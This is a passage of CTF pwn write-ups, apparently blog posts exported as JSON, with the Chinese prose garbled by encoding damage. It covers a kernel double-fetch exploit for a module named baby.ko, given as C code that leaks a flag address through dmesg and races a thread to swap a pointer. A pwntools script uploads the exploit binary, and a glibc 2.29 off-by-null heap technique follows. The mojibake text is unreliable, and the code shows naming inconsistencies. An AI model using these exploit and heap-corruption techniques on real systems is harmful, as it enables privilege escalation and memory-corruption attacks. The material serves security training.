¸é…ç½®ç¯å¢ƒï¼š\n\n(1)IDAæ‰“å¼€baby.koæŸ¥çœ‹åå…­è¿›åˆ¶çš„æ±‡ç¼–å¯ä»¥çœ‹åˆ°è°ƒç”¨çš„Linuxç‰ˆæœ¬ï¼Œå¯ä»¥ä¸‹è½½æºç ç¼–è¯‘æˆ–è€…ç›´æ¥ä¸‹è½½ç¼–è¯‘å¥½çš„ã€‚![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-27_12-07-25.png)\n\n(2)è§£å‹å¾—åˆ°å‹ç¼©å†…æ ¸ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\napt search linux-image-[version]\napt download xxxx\nar -x linux-image-4.15.0-22-generic_4.15.0-22.24_amd64.deb\n```\n\nåœ¨./data/bootä¸­æœ‰vmlinuz-4.15.0-22-genericï¼Œä¸è¦å†ç±»ä¼¼å‹ç¼©ä¸ºbzImageï¼Œå¯ä»¥ç›´æ¥ç”¨æ¥å¯åŠ¨qemuã€‚\n\n(3)é…ç½®æ–‡ä»¶ç³»ç»Ÿå’Œå¯åŠ¨è„šæœ¬ï¼š\n\nâ‘ æ–‡ä»¶ç³»ç»Ÿï¼šç”¨busyboxåˆ¶ä½œçš„ï¼Œfind ./* | cpio -H newc -o > rootfs.cpio\n\n![1](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1.png)\n\nâ‘¡å¯åŠ¨è„šæœ¬å’Œé…ç½®æ–‡ä»¶ï¼š\n\n![2](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2.png)\n\n```bash\n#! /bin/sh\nqemu-system-x86_64 \\\n-m 256M -smp 4,cores=2,threads=2 \\\n-kernel ./vmlinux \\\n-initrd ./rootfs.cpio \\\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokalsr\" \\\n-cpu qemu64 \\\n-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\\n-nographic \\\n#-gdb tcp::1234 \\\n# -S\n```\n\n \n\n2.å¼€å§‹è§£æbaby.ko\n\n(1)ä¸¤ä¸ªå®é™…å‘½ä»¤ï¼Œåœ¨baby_ioctlå‡½æ•°ä¸­ï¼š\n\n![3](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs3.png)\n\nâ‘ 0x6666å‘½ä»¤å¯ä»¥å¾—åˆ°flagåœ¨å†…æ ¸ç©ºé—´çš„åœ°å€\n\nâ‘¡0x1337å‘½ä»¤ä¼šè§¦å‘ä¸‰ä¸ªæ£€æŸ¥ï¼Œå¦‚æœæ£€æŸ¥æˆåŠŸåˆ™å¯ä»¥æ‰“å°å‡ºflag\n\n(2)æ¼æ´ç‚¹ï¼š\n\næ¼æ´åœ¨æ£€æŸ¥ä¸Šï¼Œä¸‰ä¸ªæ£€æŸ¥æ˜¯æ£€æŸ¥é€šè¿‡ioctlä¼ å…¥çš„æ•°æ®rdxã€‚\n\nâ–²_chk_range_not_okå‡½æ•°ï¼šå°†ç¬¬ä¸€ä¸ªå‚æ•°rdiå’Œç¬¬äºŒä¸ªå‚æ•°rsiç›¸åŠ ï¼Œåˆ¤æ–­æ˜¯å¦å°äºç¬¬ä¸‰ä¸ªå‚æ•°rdxï¼Œå¦‚æœå¤§äºç­‰äºå°†alç½®ä¸º1(alå³raxçš„ä½8ä½å¯„å­˜å™¨)ï¼Œå¦‚æœå°äºåˆ™è¿”å›0ï¼Œè€Œå¦‚æœè¦è¿›å…¥è¯¥ifï¼Œåˆ™éœ€è¦è¿”å›å€¼ä¸º0ï¼Œåˆ™éœ€rdi+rsi < rdxã€‚\n\nâ‘ æ£€æŸ¥ä¸€ï¼š_chk_range_not_ok(v2, 16LL, *(__readgsqword(&current_task) + 4952)å…¶ä¸­çš„*(__readgsqword(&current_task) + 4952)å…¶å®æ˜¯ç”¨æˆ·ç©ºé—´çš„èµ·å§‹åœ°å€ï¼š\n\n![4](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs4.png)\n\nå³ä¼ å…¥æ•°æ®çš„åœ°å€åŠ ä¸Š16éœ€è¦å°äº0x7ffffffff000ï¼Œè€Œå°äº0x7ffffffff000åˆ™è¡¨ç¤ºå¤„åœ¨ç”¨æˆ·ç©ºé—´ä¸­ï¼š\n\n![5](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs5.png)\n\né‚£ä¹ˆå°±æ˜¯æ£€æŸ¥ä¼ å…¥çš„æ•°æ®çš„åœ°å€æ˜¯å¦ä½äºç”¨æˆ·ç©ºé—´ã€‚\n\nâ‘¡æ£€æŸ¥äºŒå³å°†ä¼ å…¥çš„æ•°æ®ä½œä¸ºä¸€ä¸ªç»“æ„ä½“ï¼Œæ£€æŸ¥è¯¥ç»“æ„ä½“ä¸­flagæŒ‡é’ˆå¯¹åº”çš„æ•°æ®çš„åœ°å€åŠ ä¸Šflagçš„é•¿åº¦æ˜¯å¦ä½äºç”¨æˆ·ç©ºé—´ã€‚\n\nâ‘¢æ£€æŸ¥ä¸‰å³æ£€æŸ¥flagçš„é•¿åº¦æ˜¯å¦å’Œç¨‹åºä¸­ç¡¬ç¼–ç çš„é•¿åº¦ç›¸ç­‰ã€‚\n\nâ–²ç”±äºä¼ å…¥çš„ç»“æ„ä½“æ˜¯ç”±æˆ‘ä»¬æ§åˆ¶çš„ï¼Œä¸”è¿‡ç¨‹ä¸­ä¾æ®è¯¥ç»“æ„ä½“æ¥ç´¢å¼•flagï¼Œå…¶ä¸­çš„flagæŒ‡é’ˆæˆ‘ä»¬ä¹Ÿå¯ä»¥æ”¹å˜ï¼Œæ‰€ä»¥å¦‚æœåœ¨æ£€æŸ¥ç»“æŸä¹‹åï¼Œæ‰“å°flagä¹‹å‰ï¼Œèƒ½å¤Ÿå°†flagæŒ‡é’ˆæŒ‡å‘å†…æ ¸ç©ºé—´çœŸæ­£çš„flagå¤„ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿé€šè¿‡ï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\nfor ( i = 0; i < strlen(flag); ++i )\n{\n    if ( *(*v5 + i) != flag[i] )\n    return 22LL;\n}\n```\n\nä»è€Œæ‰“å°å†…æ ¸ç©ºé—´çœŸæ­£çš„flagäº†ã€‚è€Œè¿™ä¸ªå†…æ ¸ç©ºé—´flagçš„åœ°å€å¯ä»¥é€šè¿‡å‘½ä»¤0x6666å¾—åˆ°ï¼Œè¿™æ ·å°±ç±»ä¼¼äºåˆ©ç”¨äº†ä¸€ä¸ªæ¡ä»¶ç«äº‰çš„æ¼æ´ã€‚\n\n \n\n3.ç¼–å†™exp\n\n(1)é¦–å…ˆæ˜¯ç»“æ„ä½“ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nstruct MyflagStruc\n{\n    char *flag;\n    size_t len;\n};\n```\n\n(2)æ¥ç€æ‰“å¼€devè·å–åœ°å€:\n\n```\n#æ³¨é‡Šå¤´\n\nint fd = open(\"/dev/baby\",O_RDONLY);\nioctl(fd,0x6666);\n\nsystem(\"dmesg > /tmp/record.txt\");\nallInfo_fd= open(\"/tmp/record.txt\",O_RDONLY);\nlseek(allInfo_fd,-0x1000,SEEK_END);\nread(allInfo_fd,buf,0x1000);\nclose(allInfo_fd);\nidx = strstr(buf,\"Your flag is at \");\nif (idx == 0){\n    printf(\"[-]Not found addr\");\n    exit(-1);\n}\nelse{\n    idx += 16;\n    kernelFlag_addr = strtoull(idx,idx+16,16);\n    printf(\"[+]kernelFlag_addr: %p\\n\",kernelFlag_addr);\n}\n```\n\nâ‘ å…³äºdmesgï¼Œè¿™ä¸ªå‘½ä»¤æ˜¯è·å–ä»å¯åŠ¨è™šæ‹Ÿæœºå¼€å§‹çš„å‡ ä¹æ‰€æœ‰çš„è¾“å‡ºä¿¡æ¯ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æ‰“å¼€babyè¿™ä¸ªdevï¼Œå°±èƒ½å¤Ÿå¾—åˆ°é‡Œé¢printkå‡½æ•°çš„ç›¸å…³è¾“å‡ºï¼Œç„¶åæŠŠè¾“å‡ºé‡å®šå‘åˆ°/tmp/record.txtè¿™é‡Œé¢ï¼Œå†ä»record.txtä¸­è·å–åœ°å€ã€‚åŒæ—¶ç”±äºæ˜¯æ‰€æœ‰çš„è¾“å‡ºä¿¡æ¯ï¼Œæ‰€ä»¥è¿”å›ç»™æˆ‘ä»¬çš„flagåœ°å€è‚¯å®šæ˜¯åœ¨æœ€åé¢çš„ï¼Œæ‰€ä»¥lseek(allInfo_fd,-0x1000,SEEK_END);ä»æœ€åé¢å¾€å‰è·å–0x1000ä¸ªå­—èŠ‚ï¼Œç„¶åå†æ¥ç”¨strstrè·å–å­å­—ç¬¦ä¸²ç´¢å¼•ï¼Œæœ€åstrtoullè½¬æ¢åœ°å€å¾—åˆ°å†…æ ¸ä¸­flagçš„åœ°å€ã€‚\n\n![6](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs6.png)\n\n(3)ç„¶ååˆ›å»ºçº¿ç¨‹ï¼Œçˆ†ç ´ä¿®æ”¹æ•°æ®ä¸­flagæŒ‡å‘çš„åœ°å€ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nMyflagStruc myflag;\nmyflag.len = 33;\nmyflag.flag = buf;\npthread_create(&myflag, NULL, change_attr_value,&myflag);\nfor(int i = 0; i < 0x1000; i ++){\n    ret = ioctl(fd, 0x1337, &myflag);\n    myflag.flag = buf;\n}\nfinish = 1;\npthread_join(myflag, NULL);\nclose(fd);\nputs(\"[+]result is :\");\nsystem(\"dmesg | grep flag\");\n```\n\nçº¿ç¨‹æ–¹é¢è¿™æ¶‰åŠå›è°ƒå‡½æ•°ç›¸å…³çŸ¥è¯†ï¼Œè‡ªå·±è¡¥å§ã€‚\n\n(4)çº¿ç¨‹å›è°ƒå‡½æ•°ï¼šä¿®æ”¹flagæŒ‡å‘å†…æ ¸çš„flagï¼Œä»è€Œèƒ½å¤Ÿé€šè¿‡é€å­—èŠ‚éªŒè¯\n\n```\n#æ³¨é‡Šå¤´\n\nvoid changeFlagAddr(void *myflag){\n    while(finish==0){\n        myflag->flag = kernelFlag_addr ;\n    }\n}\n```\n\n \n\n4.ä¸€äº›æ³¨æ„äº‹é¡¹ï¼š\n\n(1)å¤´æ–‡ä»¶çš„æ³¨æ„äº‹é¡¹ï¼Œå’Œå†™å°ç¨‹åºä¸€æ ·ï¼Œè‡ªå·±åŠ ã€‚\n\n(2)çº¿ç¨‹æ³¨æ„äº‹é¡¹ï¼šgccç¼–è¯‘æ—¶éœ€è¦åŠ ä¸Š-lpthreadå‚æ•°ï¼Œå¹¶ä¸”è¦é™æ€ç¼–è¯‘ã€‚\n\n(3)è¾“å…¥è¾“å‡ºé‡å®šå‘ï¼šæˆ‘çœ‹å¾ˆå¤šexpéƒ½æœ‰å…³é—­è¾“å…¥è¾“å‡ºæµçš„ï¼Œä½†æ˜¯æˆ‘å°è¯•äº†ä¸€ä¸‹ï¼Œä¸ç”¨å…³å…¶å®ä¹Ÿå¯ä»¥ï¼Œå¯èƒ½æ˜¯å¯¹åº”çš„ç¯å¢ƒå…³ç³»å§ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nsetvbuf(stdin,0,2,0);\nsetvbuf(stdout,0,2,0);\nsetvbuf(stderr,0,2,0);\n```\n\n(4)æ–‡ä»¶ä¼ è¾“æ¨¡å—ï¼š\n\nå…ˆè½¬å‘ä¸€ä¸‹å¯åŠ¨ç¨‹åºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nsocat tcp-listen:30000,fork exec:./boot.sh,reuseaddr\n```\n\nå¯ä»¥ç”¨ä¸‹åˆ—è„šæœ¬ï¼Œè¿™ä¸ªè„šæœ¬å‚ç…§è¿™ä½å¸ˆå‚…çš„ï¼š\n\nhttps://blog.csdn.net/seaaseesa/article/details/104537991\n\n```\n#æ³¨é‡Šå¤´\n\n# coding:utf8\nfrom pwn import *\nimport base64\n \nsh = remote('127.0.0.1',30000)\n \n#exploit\nf = open('./exp','rb')\ncontent = f.read()\ntotal = len(content)\nf.close()\n\n# segment send\nper_length = 0x200;\n# touch file\nsh.sendlineafter('$ ','touch /tmp/exploit')\n\nlog.info(\"Total length:%d\"%total)\nfor i in range(0,total,per_length):\n   bstr = base64.b64encode(content[i:i+per_length])\n   sh.sendlineafter('$ ','echo {} | base64 -d >> /tmp/exploit'.format(bstr))\n   print(i)\n   \nif total - i > 0:\n   bstr = base64.b64encode(content[total-i:total])\n   sh.sendlineafter('$ ','echo {} | base64 -d >> /tmp/exploit'.format(bstr))\n \nsh.sendlineafter('$ ','chmod +x /tmp/exploit')\nsh.sendlineafter('$ ','/tmp/exploit')\nsh.interactive()\n```\n\n(5)è°ƒè¯•æ¨¡å—ï¼š\n\nå…³äºæ–‡ä»¶ç³»ç»Ÿçš„é€‰æ‹©æ–¹é¢ï¼Œç”¨ç²¾ç®€ç‰ˆçš„Busyboxå¼€å‡ºæ¥çš„qemuè°ƒè¯•çš„æ—¶å€™è·å–åŠ è½½æ¨¡å—çš„åŸºåœ°å€æ€»æ˜¯å‡ºé”™ï¼Œæš‚æ—¶ä¸çŸ¥é“ä¸ºä»€ä¹ˆåé¢è¡¥ã€‚\n\nä½†æ˜¯å¯ä»¥ç”¨2018å¼ºç½‘æ¯coreçš„æ–‡ä»¶ç³»ç»Ÿï¼ŒåŠ è½½ä¹‹åè°ƒè¯•çš„åŸºåœ°å€æ²¡é—®é¢˜ï¼Œè¿™ä¸ªåœ¨ctfwikiä¸Šæœ‰ã€‚\n\n \n\n","tags":["kernelé¢˜"],"categories":["pwn-kernel","Kernel_doubleFetch"]},{"title":"2.29ä¸‹çš„off-by-null","url":"/2021/08/14/2.29ä¸‹çš„off-by-null/","content":"\nâ–³ç›¸æ¯”2.29ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œåœ¨å‘ä¸Šåˆå¹¶æ—¶åŠ äº†ä¸€é¡¹æ£€æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif (__glibc_unlikely (chunksize(p) != prevsize))\n    malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n```\n\nå°±æ˜¯æ£€æŸ¥ä¸Šä¸€ä¸ªchunkçš„sizeæ˜¯å¦ç­‰äºå½“å‰chunkçš„pre_sizeã€‚ä¹‹å‰çš„off-by-nullè‚¯å®šæ˜¯ä¸ç­‰äºçš„å•Šï¼Œæ‰€ä»¥è¿™é‡Œå°±ä¸€å®šä¼šå‡ºé”™ã€‚é‚£ä¹ˆ2.29çš„ç»•è¿‡æ–¹æ³•å°±æ˜¯é€šè¿‡smallbinå’Œlargebinæ¥ä¼ªé€ ä¸€ä¸ªchunkï¼Œæ»¡è¶³ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nâ‘ fake_chunk->fd->bk == fake_chunk_addr\nâ‘¡fake_chunk->bk->fd == fake_chunk_addr\nâ‘¢fake_chunk->size = trigger_chunk->pre_size\n```\n\nå…¶ä¸­â‘¢ç”¨æ¥è¿‡æ–°å¢åŠ çš„æ£€æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif (__glibc_unlikely (chunksize(p) != prevsize))\n    malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n```\n\nâ‘ å’Œâ‘¡ç”¨æ¥è¿‡unlinkä¸­çš„æ£€æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))\n    malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);\n```\n\nè¿™æ ·å°±èƒ½å¤ŸæˆåŠŸoff-by-nulläº†ï¼Œå›¾ç¤ºå¦‚ä¸‹(ç”¨äº†[t1an5gçš„åšå®¢](https://bbs.pediy.com/thread-257901-1.htm#msg_header_h2_2)çš„å›¾ç‰‡ï¼Œä¾µåˆ )ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191444152.png)\n\n1.ä¸‹é¢ç®€å•è¯´ä¸‹æµç¨‹ï¼š\n\n(1)è¿›è¡Œä¸€å®šçš„å †å¸ƒå±€ï¼Œä½¿å¾—èµ·ä½œç”¨çš„chunkçš„å †åœ°å€ä¸º0xx...x0010ï¼ŒåŒæ—¶ä¹Ÿæ–¹ä¾¿è®¡ç®—åç§»ï¼Œä»è€Œè¿›è¡Œä½ä½å­—èŠ‚è¦†ç›–ã€‚\n\n(2)é€šè¿‡largebinçš„fd_nextsizeæŒ‡é’ˆå’Œbk_nextsizeæŒ‡é’ˆï¼ŒåŠ ä¸Šå­—èŠ‚è¦†ç›–ä½¿å¾—fake_chunkçš„fdæŒ‡é’ˆæŒ‡å‘æŒ‡å®šFD(å³ä¸‹é¢çš„chunk18)ï¼Œfake_chunkçš„bkæŒ‡é’ˆæŒ‡å‘æŒ‡å®šBK(å³ä¸‹é¢çš„chunk17)ã€‚\n\n(3)é€šè¿‡fastbinå’Œsmallbinçš„è¿ç”¨ï¼ŒåŠ ä¸Šå­—èŠ‚è¦†ç›–ä½¿å¾—FD(chunk18)çš„bkæŒ‡é’ˆæŒ‡å‘fake_chunkã€‚\n\n(4)é€šè¿‡fastbinåŠ ä¸Šå­—èŠ‚è¦†ç›–ä½¿å¾—BK(chunk17)çš„fdæŒ‡é’ˆæŒ‡å‘fake_chunkã€‚\n\n(5)è¿›è¡Œå®Œä»¥ä¸Šæ“ä½œå°±å¾—åˆ°ç±»ä¼¼ä¸Šå›¾çš„å †å¸ƒå±€ï¼Œä¹‹åå°±å¯ä»¥ç»•è¿‡æ£€æŸ¥ï¼Œè§¦å‘off-by-nullã€‚\n\n2.è¯¦ç»†ä»‹ç»ä¸€ä¸‹å…·ä½“å®ç°æ–¹æ³•ï¼š\n\n(1)å…ˆç”³è¯·17ä¸ªchunk,chunk0-chunk16ï¼Œå…¶ä¸­chunk0-chunk7ç”¨æ¥è¿›è¡Œå †å¸ƒå±€ï¼Œä½¿å¾—åé¢çš„chunk15çš„åœ°å€ä¸º0xx..x0010ï¼Œå³ä½¿å¾—ç”³è¯·çš„å †åœ°å€çš„ç¬¬äºŒä¸ªå­—èŠ‚ä¸º\"\\x00\"ï¼Œä»¥ä¾¿ä¹‹åè¦†ç›–çš„æ—¶å€™ä¸ç”¨è¿›è¡Œä¸€å­—èŠ‚çˆ†ç ´ï¼Œä»è€Œè¿›è¡Œå¯¹æŠ—off-by-nullçš„0å­—èŠ‚æº¢å‡ºã€‚å½“ç„¶ï¼Œå¦‚æœæ¡ä»¶é™åˆ¶çš„è¯ï¼Œ å…¶å®æ˜¯å¯ä»¥ä¸ç”¨chunk0-chunk7çš„å¸ƒå±€ï¼Œç”¨ä¸€å­—èŠ‚çˆ†ç ´æ¥è§£å†³é—®é¢˜ã€‚chunk8-chunk14å¤§å°ä¸º0x28ï¼Œç”¨æ¥å¡«å……0x30å¤§å°çš„tcacheã€‚chunk15å³å…³é”®éƒ¨åˆ†ï¼Œchunk16é˜²æ­¢åˆå¹¶ã€‚\n\n(2)é‡Šæ”¾chunk15ï¼Œsizeåº”è¯¥å¤§äºtcacheçš„æœ€å¤§sizeï¼Œè¿™é‡Œçš„chunk15æœ€å¥½è®¾ç½®å¤§ä¸€ç‚¹ï¼Œå¤§ä½¬çš„åšå®¢è®¾ç½®äº†0xb20å¤§å°ã€‚ç„¶åchunk15å°±ä¼šè¿›å…¥unsortedbinä¸­ï¼Œç”±äºunsortedbinä¸­åªæœ‰ä¸€ä¸ªchunk15ï¼Œæ‰€ä»¥chunk15çš„æŒ‡é’ˆä¼šæœ‰ä»¥ä¸‹æ•ˆæœï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchunk15->fd == main_arena+88(unsortebin_addr)\nchunk15->bk == main_arena+88\n```\n\n(3)ç”³è¯·ä¸€ä¸ª0x28å¤§å°çš„chunk17ï¼ŒåŒæ—¶ç”±äºæ­¤æ—¶binä¸­æ²¡æœ‰chunkï¼Œåªæœ‰Unsortedbinæ‰æœ‰chunk15ï¼Œæ‰€ä»¥ä¼šå°†chunk15å…ˆæ”¾å…¥largebinä¸­ï¼Œä¹‹åå†ä»chunk15ä¸­åˆ‡å‰²ï¼Œè¿”å›chunk17ï¼Œæ‰€ä»¥æ­¤æ—¶chunk15åœ¨largebinä¸­ï¼Œåˆåªæœ‰å®ƒä¸€ä¸ªchunkï¼Œç”±äºæ”¾å…¥largebinçš„èµ‹å€¼è¯­å¥ï¼Œæ‰€ä»¥åœ¨åˆ‡å‰²ä¹‹å‰ä¼šå˜æˆï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchunk15->fd == largebin_addr\nchunk15->bk == largebin_addr\nchunk15->fd_nextsize == chunk15_addr\nchunk15->bk_nextsize == chunk15_addr\n```\n\nåˆ‡å‰²ä¹‹åï¼Œchunk17è·å¾—äº†chunk15æ®‹ç•™ä¸‹æ¥çš„fdï¼Œbkï¼Œfd_nextsizeï¼Œbk_nextsizeã€‚å› ä¸ºchunk17æ˜¯ç”¨æ¥æ„é€ fake_chunkçš„ï¼Œæ‰€ä»¥å¤§å°éœ€è¦è‡³å°‘æœ‰0x20ã€‚é‚£ä¹ˆæ­¤æ—¶çš„chunk17ä¸­å†…å®¹å°±ä¼šå¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchunk17->fd == largebin_addr\nchunk17->bk == largebin_addr\nchunk17->fd_nextsize == chunk17_addr\nchunk17->bk_nextsize == chunk17_addr\n```\n\nç„¶åæ„é€ åœ¨chunk17é‡Œåˆ¶ä½œfake_chunkï¼Œæ»¡è¶³ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfake_chunk->size == trigger_chunk->pre_size\nfake_chunk->fd == chunk18_addr\nfake_chunk->bk == chunk17_addr\n```\n\nè¿™é‡Œéœ€è¦è¿›è¡Œèµ‹å€¼ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchunk17->fd = trigger_chunk->pre_size\nchunk17->fd_nextsize = \"\\x40\"\n```\n\n(åé¢ä¼šè®²åˆ°ä¸ºä»€ä¹ˆä¼šè¿™ä¹ˆèµ‹å€¼)ä¹‹åçš„fake_chunkçš„bkè‡ªåŠ¨ç»§æ‰¿äº†ä¹‹å‰æ®‹ç•™ä¸‹æ¥çš„æŒ‡é’ˆã€‚\n\n(4)ç”³è¯·chunk18-chunk21ï¼Œå¤§å°ä¸º0x28ã€‚ä½¿å¾—chunk18-chunk21éƒ½æ˜¯ä»chunk15ä¸­åˆ‡å‰²å‡ºæ¥çš„ï¼Œä¹‹åç”¨chunk8-chunk14å¡«æ»¡0x30çš„tcacheï¼Œç„¶åå†é¡ºåºé‡Šæ”¾chunk20å’Œchunk18ï¼Œä½¿å¾—chunk18,chunk20è¿›å…¥fastbin(0x30)ä¸­ï¼Œé¡ºåºä¸ºchunk18->chunk20ã€‚\n\n(5)å°†chunk8-chunk14ç”³è¯·å‡ºæ¥ï¼Œæ¸…ç©ºtcache(0x30)ï¼Œç„¶åå†ç”³è¯·ä¸€ä¸ª0x400å¤§å°çš„chunk(è¶…è¿‡smallbinå¤§å°å³å¯)ï¼Œè¿™æ ·å°±ä¼šå°†fastbinä¸­çš„chunkï¼Œä¹Ÿå°±æ˜¯chunk18å’Œchunk20æ”¾å…¥åˆ°smallbinä¸­ã€‚ç”±äºsmallbinå’Œfastbinåˆšå¥½ç›¸åï¼Œä¸€ä¸ªæ˜¯FIFOä¸€ä¸ªæ˜¯FILOï¼Œæ‰€ä»¥é¡ºåºä¼šåè¿‡æ¥ï¼Œå˜æˆï¼šchunk20->chunk18ï¼Œä½†åŒæ—¶ç”±äºæ˜¯bkå¯»å€ï¼Œæ‰€ä»¥å†ç”³è¯·chunkä¼šå…ˆæŠŠchunk18å–å‡ºæ¥ï¼ŒåŒæ—¶åœ¨smallbinä¸­ï¼Œé‚£ä¹ˆå°±ä¼šæ»¡è¶³chunk18->bk == chunk20_addr\n\n(6)æ­¤æ—¶èµ‹å€¼chunk18->bk = fake_chunk_addrï¼Œè¿™é‡Œä¸ç”¨çŸ¥é“å †åœ°å€ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“chunk20_addr - fake_chunk_addr == 0x80(sizeof(fake_chunk)+sizeof(chunk18)+sizeof(chunk19))ã€‚æ‰€ä»¥ä¹‹å‰chunk0-chunk7å°±å¯ä»¥è¿›è¡Œä¸€äº›å¤§å°å¸ƒå±€ï¼Œä½¿å¾—chunk15_addr == 0xx...x0010ï¼Œé‚£ä¹ˆfake_chunk_addr == 0xx...x0020ï¼Œchunk20_addr == 0xx...x00a0ï¼Œè¿™æ ·æˆ‘ä»¬å°±åªéœ€è¦æŠŠ0xa0è¦†ç›–æˆ0x20ï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹chunk18->bkçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸º0x20å³å¯ã€‚ä½†åŒæ—¶ç”±äºoff by nullçš„å…³ç³»ï¼Œä¿®æ”¹chunk18->bkçš„ç¬¬ä¸€ä¸ªå­—èŠ‚åŠ¿å¿…ä¼šå¯¼è‡´ç¬¬äºŒä¸ªå­—èŠ‚ä¸º\"\\x00\"ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹‹å‰çš„å †å¸ƒå±€ä¹Ÿè¦ä½¿å¾—chunk15_addrçš„ç¬¬äºŒä¸ªå­—èŠ‚ä¸º\"\\x00\"æ‰å¯ä»¥ã€‚\n\né‚£ä¹ˆç°åœ¨ä¹Ÿå¯ä»¥ç†è§£ä¹‹å‰çš„ä¸€ä¸ªèµ‹å€¼è¯­å¥ï¼šchunk17->fd_nextsize = \"\\x40\"ï¼Œè¿™é‡Œå°±æ˜¯ä¸ºäº†å°†\"\\x10\"è¦†ç›–ä¸º\"\\x40\"ä½¿å…¶æŒ‡å‘chunk18ï¼ŒåŒæ—¶ä½¿å¾—ç¬¬äºŒä¸ªå­—èŠ‚ä¹Ÿä¸º\"\\x00\"ã€‚\n\nè¿™æ ·å°±æ»¡è¶³äº†ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfake_chunk->size == trigger_chunk->pre_size\nfake_chunk->fd == chunk18_addr\nfake_chunk->bk == chunk17_addr\nchun18->bk == fake_chunk_addr\nchunk17->fd == chunk18_addr\n```\n\nä½†æ˜¯chunk17->fdä¸ç­‰äºfake_chunk_addrã€‚é‚£ä¹ˆåŒæ ·çš„æ“ä½œå†æ¥ä¸€æ¬¡ï¼Œåˆ©ç”¨chunk17å’Œchunk19ï¼Œä½¿å…¶è¿›å…¥fastbinï¼Œå°†chunk17çš„fdæŒ‡å‘chunk19ï¼Œç„¶åå†ç”³è¯·å›æ¥ï¼Œè¦†ç›–chunk17çš„fdæŒ‡é’ˆï¼Œ0x70è¦†ç›–ä¸º0x20å³å¯ã€‚(ç”±äº2.29ä¸‹çš„tcacheä¼šæœ‰keyå­—æ®µï¼Œä½¿å¾—chunk17çš„bkæŒ‡é’ˆè¢«ä¿®æ”¹ï¼Œç›¸å½“äºä¿®æ”¹fake_chunkçš„sizeä½ï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬æƒ³çœ‹åˆ°çš„ï¼Œæ‰€ä»¥è¿˜æ˜¯ç”¨fastbinæ¯”è¾ƒå¥½)æµç¨‹å¦‚ä¸‹ï¼š\n\nâ‘ å°†chunk20ä»tcacheä¸­ç”³è¯·å‡ºæ¥ï¼Œé˜²æ­¢ä¹‹åä¸å¥½æ“ä½œï¼Œç„¶åå†å°†chunk8-chunk14æ”¾å…¥tcacheä¸­ï¼Œä½¿å¾—ä¹‹åçš„chunkè¿›å…¥fastbinã€‚\n\nâ‘¡é¡ºåºé‡Šæ”¾chunk19ï¼Œchunk17ï¼Œä½¿å…¶è¿›å…¥fastbinä¸­ï¼Œä½¿å¾—chunk17->fd == chunk19_addrï¼Œå°±æ˜¯0xx...x70ã€‚\n\nâ‘¢ç„¶åå°†chunk8-chunk14ç”³è¯·å›æ¥ï¼Œå†å°†chunk17ç”³è¯·å›æ¥ï¼Œè¦†ç›–chunk17çš„fdçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸º0x20ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ»¡è¶³æ€»çš„æ¡ä»¶ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfake_chunk->size == trigger_chunk->pre_size\nfake_chunk->fd == chunk18_addr\nfake_chunk->bk == chunk17_addr\nchunk18->bk == fake_chunk_addr\nchunk17->fd == fake_chunk_addr\n```\n\n(7)æœ€åå°†chunk19ç”³è¯·å›æ¥ï¼Œå†ä»chunk15å‰©ä¸‹çš„éƒ¨åˆ†ç”³è¯·chunk22ç”¨æ¥æº¢å‡ºã€‚å†ç”³è¯·chunk23å°†chunk15é—ç•™çš„éƒ¨åˆ†éƒ½ç”³è¯·å›æ¥ï¼Œæº¢å‡ºä¹‹åé‡Šæ”¾æ‰ï¼Œå³å¯è§¦å‘off by nullï¼Œå‘ä¸Šåˆå¹¶æœ€åˆçš„chunk15-0x10å¤§å°çš„chunkï¼Œä½¿å¾—fake_chunkï¼Œchunk18,chunk19,chunk20,chunk21,chunk22,chunk23éƒ½è¢«ç½®å…¥unsortedbinä¸­ã€‚åˆ©ç”¨chunk8-chunk14å¯¹æŠ—tcacheï¼Œå°±å¯ä»¥éšä¾¿ç©äº†ã€‚(æ³¨æ„è¿™é‡Œä¸éœ€è¦åƒä¹‹å‰ç‰ˆæœ¬çš„off by nullä¸€æ ·ï¼Œè¿˜éœ€è¦é‡Šæ”¾æ‰chunk0æ¥ç»•è¿‡unlinkæ£€æŸ¥ï¼Œä¹‹å‰æ˜¯å› 